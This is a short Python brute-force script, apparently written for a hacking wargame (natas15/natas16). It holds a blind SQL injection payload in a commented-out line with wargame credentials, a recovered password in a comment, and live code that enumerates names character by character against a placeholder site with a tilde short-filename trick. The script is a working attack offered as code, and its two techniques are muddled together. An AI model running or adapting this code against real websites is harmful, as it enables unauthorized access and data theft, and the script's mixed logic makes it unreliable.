import requests

chars='abcdefghijklmnopqrstuvwxyz0123456789._-'
url = 'https://www.sitename.com/'
password=''
findch='no'
# password is 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
print('Scan by Bruteforce')

while len(password) < 8:
	findch='no'
	for letter in chars:
		myobj = {'username': 'natas16" and password like binary "'+password+letter+'%%'}
		myurl = url+password+letter+'*~1*/a.aspx'
		#print(myurl)
		#print(password+letter)
		cookies_aut = ""
		#x = requests.post(myurl, myobj,cookies = {"Authorization": "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="},auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'))
		x = requests.get(myurl)
		#print(x.text)
		#print('-------------------------------------------')
		print('search for: '+password+letter)
		if 'temporarily' in x.text :
			password +=letter
			print('char founded: <'+letter+'> name now is :'+password)
			findch='yes'
			break
	if findch =='no' :
		print('more char not find')
	#print('findch=====',findch)
#print(x.text)

print('\n End. and password is : '+password)
